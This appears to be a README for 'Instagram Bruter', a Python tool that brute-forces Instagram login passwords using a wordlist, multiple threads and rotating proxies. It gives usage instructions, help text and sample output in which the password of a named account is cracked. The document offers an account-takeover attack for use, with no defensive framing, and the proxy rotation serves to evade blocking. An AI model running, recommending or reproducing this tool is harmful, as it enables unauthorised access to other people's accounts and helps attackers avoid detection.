# Instagram Bruter

Re-engineered to work **without** TOR

__Usage:__ `python instagram.py <username> <wordlist> <threads>`
<br>
**Example:** `python instagram.py Sami09.1 pass.lst 16`

### Requirements
- Python *v2.x* **|** *v3.x*
- ~~Kali Linux 2.0~~
- ~~TOR~~

### Help
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py -h
usage: instagram.py [-h] username wordlist threads

positional arguments:
  username    email or username
  wordlist    password list
  threads     password per seconds. Any number <= 16

optional arguments:
  -h, --help  show this help message and exit
```

### Start
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst 16
```

### Run
```
[-] Proxy-IP: 159.89.133.123[United States]
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 16
[-] Attempts: 16
[-] Proxies: 395
````

### Stop
```
[-] Proxy-IP: 167.99.12.149[United States]
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Attempts: 22
[-] Proxies: 394

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```